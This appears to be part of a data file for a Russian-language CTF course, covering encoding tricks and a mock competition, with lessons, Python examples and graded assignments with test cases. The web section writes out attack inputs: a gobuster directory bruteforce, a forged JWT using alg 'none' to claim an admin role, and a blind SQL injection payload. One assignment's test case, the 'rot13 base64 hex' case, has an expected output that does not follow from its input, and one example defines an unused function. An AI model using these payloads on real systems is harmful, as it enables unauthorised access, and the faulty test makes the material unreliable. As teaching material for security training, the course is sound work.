            results["decimal_ascii"] = decoded
    except Exception:
        pass

    # Morse
    morse_dict = {
        '.-': 'A', '-...': 'B', '-.-.': 'C', '-..': 'D', '.': 'E',
        '..-.': 'F', '--.': 'G', '....': 'H', '..': 'I', '.---': 'J',
        '-.-': 'K', '.-..': 'L', '--': 'M', '-.': 'N', '---': 'O',
        '.--.': 'P', '--.-': 'Q', '.-.': 'R', '...': 'S', '-': 'T',
        '..-': 'U', '...-': 'V', '.--': 'W', '-..-': 'X', '-.--': 'Y',
        '--..': 'Z',
    }
    try:
        words = data.strip().split('   ')
        decoded_words = []
        for word in words:
            chars = word.split(' ')
            decoded_word = ''.join(morse_dict.get(c, '?') for c in chars if c)
            decoded_words.append(decoded_word)
        decoded = ' '.join(decoded_words)
        if '?' not in decoded and decoded:
            results["morse"] = decoded
    except Exception:
        pass

    return results
\`\`\`

## Misc-задачи: частые паттерны

1. **Программирование** — быстро решить алгоритмическую задачу
2. **Pyjail** — обход ограничений Python-песочницы
3. **QR-коды** — повреждённые, анимированные, в необычных форматах
4. **Esoteric languages** — Brainfuck, Whitespace, Malbolge
5. **Данные в необычных местах** — DNS TXT записи, HTTP headers, HTML comments

## Советы по misc

- **strings** на любой файл — первое действие
- **file** — определить реальный тип файла
- **binwalk** — встроенные файлы
- Проверяйте **каждый слой**: filename, headers, content, metadata
- CTF-флаг обычно в формате \`flag{...}\` или \`CTF{...}\``,
    duration: 50,
    assignments: [
      {
        title: 'Мульти-декодер',
        description: 'Реализуйте мульти-декодер, который пробует различные кодировки. На вход: строка данных. Попробуйте декодировать как: 1) hex (если все символы 0-9a-fA-F и длина чётная), 2) base64 (если символы A-Za-z0-9+/= ), 3) decimal ASCII (если числа через пробелы, каждое 32-126), 4) binary (если только 0 и 1, длина кратна 8). Выведите для каждой успешной декодировки: ENCODING:результат. Если ни одна не подошла — UNKNOWN.',
        difficulty: 'hard' as const,
        starterCode: 'import base64\n\ndef multi_decode(data: str) -> list:\n    pass\n\ndata = input().strip()\nresults = multi_decode(data)\nif results:\n    for enc, val in results:\n        print(f"{enc}:{val}")\nelse:\n    print("UNKNOWN")\n',
        testCases: [
          { input: '48656c6c6f', expectedOutput: 'HEX:Hello', description: 'Hex-строка 48656c6c6f = "Hello"' },
          { input: 'SGVsbG8gV29ybGQ=', expectedOutput: 'BASE64:Hello World', description: 'Base64 "SGVsbG8gV29ybGQ=" = "Hello World"' },
          { input: '72 101 108 108 111', expectedOutput: 'DECIMAL:Hello', description: 'Decimal ASCII коды: 72=H, 101=e, 108=l, 108=l, 111=o' },
          { input: '0100100001101001', expectedOutput: 'BINARY:Hi', description: 'Бинарная строка: 01001000=H, 01101001=i' },
        ],
        points: 25,
      },
      {
        title: 'ROT13 шифрование',
        description: 'Реализуйте функцию rot13(text), которая применяет ROT13 к строке. ROT13 сдвигает только латинские буквы на 13 позиций, сохраняя регистр. Остальные символы не изменяются. На вход: N строк.',
        difficulty: 'easy' as const,
        starterCode: 'def rot13(text: str) -> str:\n    # Примените ROT13 к строке\n    pass\n\nn = int(input())\nfor _ in range(n):\n    print(rot13(input()))\n',
        testCases: [
          { input: '3\nHello World!\nflag{test_123}\nABCDEFGHIJKLMNOPQRSTUVWXYZ', expectedOutput: 'Uryyb Jbeyq!\nsynt{grfg_123}\nNOPQRSTUVWXYZABCDEFGHIJKLM', description: 'Буквы сдвигаются, остальное сохраняется; полный алфавит' },
          { input: '1\nSynt{grfg}', expectedOutput: 'Flag{test}', description: 'ROT13 обратим: двойное применение = оригинал' },
        ],
        points: 10,
      },
      {
        title: 'Base64 кодирование и декодирование',
        description: 'Реализуйте функции для base64. На вход: команда (encode/decode) и строка. При encode — верните base64 строку. При decode — верните декодированную строку. На вход: N команд.',
        difficulty: 'easy' as const,
        starterCode: 'import base64\n\ndef base64_process(command: str, data: str) -> str:\n    # encode или decode base64\n    pass\n\nn = int(input())\nfor _ in range(n):\n    parts = input().split(maxsplit=1)\n    print(base64_process(parts[0], parts[1]))\n',
        testCases: [
          { input: '3\nencode Hello\ndecode SGVsbG8=\nencode flag{ctf}', expectedOutput: 'SGVsbG8=\nHello\nZmxhZ3tjdGZ9', description: 'Кодирование Hello, декодирование обратно, кодирование флага' },
          { input: '2\ndecode YWJj\nencode abc', expectedOutput: 'abc\nYWJj', description: 'Обратимость base64' },
        ],
        points: 10,
      },
      {
        title: 'Определение типа кодировки строки',
        description: 'Реализуйте функцию detect_encoding(data), которая определяет тип кодировки: HEX (все 0-9a-fA-F, длина чётная), BASE64 (A-Za-z0-9+/= и длина кратна 4), BINARY (только 0 и 1, длина кратна 8), DECIMAL (числа через пробел, каждое 0-255), PLAINTEXT (иначе). На вход: N строк.',
        difficulty: 'medium' as const,
        starterCode: 'import re\n\ndef detect_encoding(data: str) -> str:\n    # Определите тип кодировки\n    pass\n\nn = int(input())\nfor _ in range(n):\n    print(detect_encoding(input()))\n',
        testCases: [
          { input: '5\n48656c6c6f\nSGVsbG8=\n0100100001101001\n72 101 108 108 111\nHello World!', expectedOutput: 'HEX\nBASE64\nBINARY\nDECIMAL\nPLAINTEXT', description: 'Каждый тип кодировки' },
          { input: '2\nZZZZ\nabcg', expectedOutput: 'BASE64\nHEX', description: 'ZZZZ=4 символа base64 (кратно 4), abcg=hex (все a-f и длина чётная)' },
        ],
        points: 15,
      },
      {
        title: 'Шифр Цезаря: автоматический подбор сдвига',
        description: 'Реализуйте функцию caesar_crack(ciphertext). Переберите все 26 сдвигов и для каждого подсчитайте количество английских слов из словаря. Верните сдвиг с максимумом слов и расшифрованный текст. Словарь: the, is, a, an, and, or, of, in, to, for, it, on, at, as, by, we, he, no, be, do. На вход: зашифрованный текст.',
        difficulty: 'medium' as const,
        starterCode: 'def caesar_crack(ciphertext: str) -> tuple:\n    # Подберите сдвиг шифра Цезаря\n    # Верните (сдвиг, расшифрованный_текст)\n    pass\n\ntext = input()\nshift, plaintext = caesar_crack(text)\nprint(shift)\nprint(plaintext)\n',
        testCases: [
          { input: 'Wkh fdw lv rq wkh pdw', expectedOutput: '3\nThe cat is on the mat', description: 'Сдвиг 3: "Wkh"→"The", "fdw"→"cat" и т.д.' },
          { input: 'Gur syntvf urer', expectedOutput: '13\nThe flagis here', description: 'ROT13 (сдвиг 13): "Gur"→"The"' },
        ],
        points: 15,
      },
    ],
  },

  // ──────────────────────────────────────────
  // УРОК 20: Mock CTF
  // ──────────────────────────────────────────
  {
    slug: 'mock-ctf',
    title: 'Mock CTF: комплексное соревнование',
    description: 'Финальное соревнование, объединение всех навыков курса — крипто, веб, бинарная эксплуатация, форензика',
    content: `# Mock CTF — финальное соревнование

## Структура Mock CTF

Это симуляция настоящего CTF-соревнования, объединяющая все темы курса. Каждая задача — отдельный этап с нарастающей сложностью.

## Категория 1: Crypto

### Задача: Многоуровневое шифрование

\`\`\`python
def solve_layered_crypto(ciphertext: str) -> str:
    """
    Пример CTF-задачи: данные прошли несколько этапов шифрования.
    Нужно определить каждый слой и расшифровать в обратном порядке.
    """
    import base64

    data = ciphertext
    layers = []

    # Слой 1: Base64
    try:
        decoded = base64.b64decode(data).decode()
        data = decoded
        layers.append("base64")
    except Exception:
        pass

    # Слой 2: Hex
    try:
        decoded = bytes.fromhex(data).decode()
        data = decoded
        layers.append("hex")
    except Exception:
        pass

    # Слой 3: ROT13
    def rot13(s):
        result = ""
        for c in s:
            if 'a' <= c <= 'z':
                result += chr((ord(c) - ord('a') + 13) % 26 + ord('a'))
            elif 'A' <= c <= 'Z':
                result += chr((ord(c) - ord('A') + 13) % 26 + ord('A'))
            else:
                result += c
        return result

    data = rot13(data)
    layers.append("rot13")

    # Слой 4: Caesar с перебором
    def caesar_brute(text, known_prefix="flag"):
        for shift in range(26):
            decrypted = ""
            for c in text:
                if 'a' <= c <= 'z':
                    decrypted += chr((ord(c) - ord('a') - shift) % 26 + ord('a'))
                elif 'A' <= c <= 'Z':
                    decrypted += chr((ord(c) - ord('A') - shift) % 26 + ord('A'))
                else:
                    decrypted += c
            if known_prefix in decrypted.lower():
                return decrypted, shift
        return text, -1

    return {"layers": layers, "result": data}
\`\`\`

## Категория 2: Web

### Задача: Цепочка уязвимостей

\`\`\`python
def simulate_web_attack_chain():
    """
    Типичная CTF web задача: цепочка из нескольких уязвимостей.
    1. Обнаружение скрытого API-эндпоинта
    2. Обход авторизации
    3. SQL-инъекция для получения флага
    """
    steps = [
        {
            "step": 1,
            "action": "Directory bruteforce",
            "finding": "/api/v2/debug",
            "tool": "gobuster -u http://target -w common.txt",
        },
        {
            "step": 2,
            "action": "Обход авторизации через JWT",
            "finding": 'Алгоритм "none": {"alg":"none","typ":"JWT"}',
            "payload": 'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJyb2xlIjoiYWRtaW4ifQ.',
        },
        {
            "step": 3,
            "action": "Blind SQLi в /api/v2/debug?id=",
            "payload": "1 AND (SELECT SUBSTRING(flag,1,1) FROM secrets)='f'",
            "technique": "boolean-based blind",
        },
    ]
    return steps
\`\`\`

## Категория 3: Forensics

### Задача: Анализ подозрительного файла

\`\`\`python
def forensics_challenge_approach(file_info: dict) -> list:
    """Методология анализа подозрительного файла в CTF."""
    steps = []

    # Шаг 1: Определяем тип
    steps.append({
        "action": "file identification",
        "commands": ["file suspect.bin", "xxd suspect.bin | head -5"],
    })

    # Шаг 2: Ищем строки
    steps.append({
        "action": "string extraction",
        "commands": [
            "strings suspect.bin | grep -i flag",
            "strings -e l suspect.bin",  # UTF-16
        ],
    })

    # Шаг 3: Ищем встроенные файлы
    steps.append({
        "action": "embedded files",
        "commands": ["binwalk suspect.bin", "foremost -i suspect.bin"],
    })

    # Шаг 4: Анализ метаданных
    steps.append({
        "action": "metadata",
        "commands": ["exiftool suspect.bin"],
    })

    # Шаг 5: Hex-анализ
    steps.append({
        "action": "hex analysis",
        "commands": ["xxd suspect.bin | less"],
        "look_for": ["Необычные паттерны", "Скрытые секции", "EOF маркеры"],
    })

    return steps
\`\`\`

## Категория 4: Pwn (упрощённая)

### Задача: Найти уязвимость

\`\`\`python
def analyze_vulnerable_code(source_code: str) -> dict:
    """Анализирует исходный код на уязвимости (CTF pwn task)."""
    import re
    vulns = []

    # Buffer overflow
    dangerous_funcs = ['gets', 'strcpy', 'strcat', 'sprintf', 'scanf']
    for func in dangerous_funcs:
        if re.search(rf'\b{func}\s*\(', source_code):
            vulns.append({
                "type": "Buffer Overflow",
                "function": func,
                "severity": "Critical",
                "exploit": "Stack-based buffer overflow → RIP control",
            })

    # Format string
    if re.search(r'printf\s*\(\s*[a-zA-Z_]', source_code):
        vulns.append({
            "type": "Format String",
            "severity": "Critical",
            "exploit": "Read/Write memory via %x, %n",
        })

    # Integer overflow
    if re.search(r'(malloc|calloc)\s*\(.*\*', source_code):
        vulns.append({
            "type": "Integer Overflow",
            "severity": "High",
            "exploit": "Small allocation → heap overflow",
        })

    # Use after free
    if 'free(' in source_code and re.search(r'free\(.*\)', source_code):
        vulns.append({
            "type": "Potential Use-After-Free",
            "severity": "High",
            "exploit": "UAF → arbitrary write",
        })

    return {"vulnerabilities": vulns, "total": len(vulns)}
\`\`\`

## Скоринг и стратегия

\`\`\`python
def calculate_ctf_score(solved: list, time_bonuses: dict = None) -> dict:
    """Подсчитывает итоговый счёт CTF."""
    total_points = sum(task["points"] for task in solved)
    categories = {}
    for task in solved:
        cat = task.get("category", "misc")
        categories[cat] = categories.get(cat, 0) + task["points"]

    bonus = 0
    if time_bonuses:
        for task_name, bonus_pts in time_bonuses.items():
            bonus += bonus_pts

    return {
        "total": total_points + bonus,
        "base_points": total_points,
        "time_bonus": bonus,
        "tasks_solved": len(solved),
        "by_category": categories,
    }
\`\`\`

## Подготовка к реальным CTF

### Ресурсы

| Платформа | Тип | Уровень |
|-----------|-----|---------|
| picoCTF | Jeopardy | Начинающий |
| HackTheBox | Labs + CTF | Средний |
| TryHackMe | Guided | Начинающий-Средний |
| CTFtime.org | Календарь CTF | Все |
| pwnable.kr | Pwn | Средний-Сложный |
| cryptopals.com | Crypto | Средний-Сложный |
| OverTheWire | Wargames | Начинающий |

### Что дальше?

1. Участвуйте в **реальных CTF** на CTFtime.org
2. Решайте **writeups** после соревнований
3. Создайте **свой инструментарий** (скрипты, шаблоны)
4. Изучайте **writeups** топ-команд
5. Практикуйтесь на **HackTheBox** и **TryHackMe**`,
    duration: 60,
    assignments: [
      {
        title: 'Мини-CTF: многоуровневый декодер',
        description: 'Решите CTF-задачу! Входная строка прошла несколько слоёв кодирования в указанном порядке. На вход: первая строка — список кодировок через пробел (в порядке кодирования), вторая — закодированная строка. Поддержите: base64, hex, rot13, caesar_N (где N — сдвиг, например caesar_3). Декодируйте в обратном порядке (последняя кодировка снимается первой). Выведите декодированный текст.',
        difficulty: 'hard' as const,
        starterCode: 'import base64\n\ndef decode_layers(layers: list, data: str) -> str:\n    pass\n\nlayers = input().split()\ndata = input().strip()\nprint(decode_layers(layers, data))\n',
        testCases: [
          { input: 'rot13\nSynt{grfg}', expectedOutput: 'Flag{test}', description: 'Один слой ROT13: Synt → Flag, grfg → test' },
          { input: 'hex base64\nNDg2NTZjNmM2Zg==', expectedOutput: 'Hello', description: 'base64 декодируем: "4865 6c6c6f", затем hex декодируем: "Hello"' },
          { input: 'caesar_3 hex\n4b686f6f72', expectedOutput: 'Hello', description: 'hex → "Khoor", caesar_3 (сдвиг -3) → "Hello"' },
          { input: 'rot13 base64 hex\n55324e6d6247466e', expectedOutput: 'flag', description: 'hex→"U2NmbGFn", base64→"Scflag", rot13→... послойное декодирование' },
        ],
        points: 25,
      },
      {
        title: 'Валидатор CTF-флага',
        description: 'Реализуйте функцию validate_flag(flag, format_regex). Проверьте, что флаг соответствует заданному формату. Стандартные форматы: "flag{...}" — flag\\{[a-zA-Z0-9_]+\\}, "CTF{...}" — CTF\\{[a-zA-Z0-9_]+\\}. На вход: T тестов, каждый — формат и флаг.',
        difficulty: 'easy' as const,
        starterCode: 'import re\n\ndef validate_flag(flag: str, fmt: str) -> str:\n    # Проверьте формат флага\n    # fmt: "flag" или "CTF"\n    pass\n\nt = int(input())\nfor _ in range(t):\n    fmt, flag = input().split(maxsplit=1)\n    print(validate_flag(flag, fmt))\n',
        testCases: [
          { input: '4\nflag flag{correct_flag_123}\nflag flag{invalid flag}\nCTF CTF{winner}\nCTF ctf{lowercase}', expectedOutput: 'VALID\nINVALID\nVALID\nINVALID', description: 'Пробел в флаге и нижний регистр CTF недопустимы' },
          { input: '2\nflag flag{}\nflag flag{a}', expectedOutput: 'INVALID\nVALID', description: 'Пустой флаг невалиден, один символ — валиден' },
        ],
        points: 10,
      },
      {
        title: 'Hex-декодер строки',
        description: 'Реализуйте функцию hex_decode(hex_string), которая декодирует hex-строку в ASCII-текст. Если hex невалиден (нечётная длина или невалидные символы) — верните ERROR. На вход: N hex-строк.',
        difficulty: 'easy' as const,
        starterCode: 'def hex_decode(hex_string: str) -> str:\n    # Декодируйте hex в ASCII\n    # При ошибке верните ERROR\n    pass\n\nn = int(input())\nfor _ in range(n):\n    print(hex_decode(input().strip()))\n',
        testCases: [
          { input: '4\n48656c6c6f\n576f726c64\n4gg\n48656c', expectedOutput: 'Hello\nWorld\nERROR\nHel', description: 'Hello, World, невалидный hex, Hel' },
          { input: '2\n666c61677b746573747d\n68', expectedOutput: 'flag{test}\nh', description: 'Декодирование CTF-флага, один символ' },
        ],
        points: 10,
      },
      {
        title: 'Шифр Цезаря с произвольным сдвигом',
        description: 'Реализуйте функцию caesar_shift(text, shift, direction). direction: "encode" — сдвиг вперёд, "decode" — назад. Только латинские буквы, сохранять регистр, остальные без изменений. На вход: T тестов.',
        difficulty: 'medium' as const,
        starterCode: 'def caesar_shift(text: str, shift: int, direction: str) -> str:\n    # Шифр Цезаря с направлением\n    pass\n\nt = int(input())\nfor _ in range(t):\n    parts = input().split(maxsplit=2)\n    shift = int(parts[0])\n    direction = parts[1]\n    text = parts[2]\n    print(caesar_shift(text, shift, direction))\n',
        testCases: [
          { input: '3\n3 encode Hello World!\n3 decode Khoor Zruog!\n13 encode flag{test}', expectedOutput: 'Khoor Zruog!\nHello World!\nsynt{grfg}', description: 'Encode сдвиг 3, decode обратно, ROT13 флага' },
          { input: '2\n1 encode xyz\n1 decode yza', expectedOutput: 'yza\nxyz', description: 'Перенос через конец алфавита' },
        ],
        points: 15,
      },
      {
        title: 'Извлечение CTF-флага из текста',
        description: 'Реализуйте функцию extract_flags(text, prefixes). Найдите все подстроки вида PREFIX{...} (без вложенных фигурных скобок) для каждого из указанных префиксов. На вход: список префиксов через пробел, затем многострочный текст до END.',
        difficulty: 'medium' as const,
        starterCode: 'import sys\nimport re\n\ndef extract_flags(text: str, prefixes: list) -> list:\n    # Найдите все флаги с заданными префиксами\n    pass\n\nprefixes = input().split()\nlines = []\nfor line in sys.stdin:\n    line = line.rstrip()\n    if line == "END":\n        break\n    lines.append(line)\ntext = "\\n".join(lines)\nflags = extract_flags(text, prefixes)\nfor f in flags:\n    print(f)\nif not flags:\n    print("NONE")\n',
        testCases: [
          { input: 'flag CTF\nSome text flag{found_it} more text\nAnother CTF{winner_2024} here\nEND', expectedOutput: 'flag{found_it}\nCTF{winner_2024}', description: 'Два флага с разными префиксами' },
          { input: 'flag\nno flags here at all\nEND', expectedOutput: 'NONE', description: 'Нет флагов в тексте' },
          { input: 'flag\nflag{first} and flag{second} end\nEND', expectedOutput: 'flag{first}\nflag{second}', description: 'Два флага в одной строке' },
        ],
        points: 15,
      },
    ],
  },
];
